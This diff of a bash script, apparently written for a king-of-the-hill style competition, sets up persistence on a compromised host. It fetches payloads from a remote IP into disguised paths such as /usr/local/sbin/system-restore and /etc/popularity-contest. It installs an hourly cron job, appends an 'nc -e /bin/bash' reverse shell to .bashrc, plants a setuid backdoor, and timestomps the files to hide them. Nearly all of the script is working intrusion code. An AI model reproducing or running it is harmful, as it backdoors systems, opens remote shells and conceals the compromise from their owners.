@@ -1,7 +1,10 @@
 #!/bin/bash
 
-wget -O /usr/local/sbin/system-restore $IP:6121/backdoor.cron
+XDG_SESSION_DATE=$(cat /tmp/.X11-LOCK-vmlinux)
+
+wget -O /usr/local/sbin/system-restore $IP:6121/king.txt
 chmod +700 /usr/local/sbin/system-restore
+touch -d "$XDG_SESSION_DATE" /usr/local/sbin/system-restore
 
 #todo - make this get system time, and pull name currently in it, and store it, and put my username in 1 second before timer hits the minute mark, then restore file
 
@@ -9,8 +12,10 @@ CT=$(crontab -l)
 CT=$CT$'\n1  * * * * system-restore || run-parts --report /etc/cron.hourly'
 printf "$CT" | crontab -
 
-#persist
 echo 'nc -e /bin/bash $IP $PORT 2>dev/null &' >> .bashrc
 
-wget -O /etc/popularity-contest $IP:6121/shell
-
+#suid bit shell
+wget -O /etc/popularity-contest $IP:6121/backdoor.suid
+chmod 777 /etc/popularity-contest
+chmod u+s /etc/popularity-contest
+touch -d "$XDG_SESSION_DATE" /etc/popularity-contest
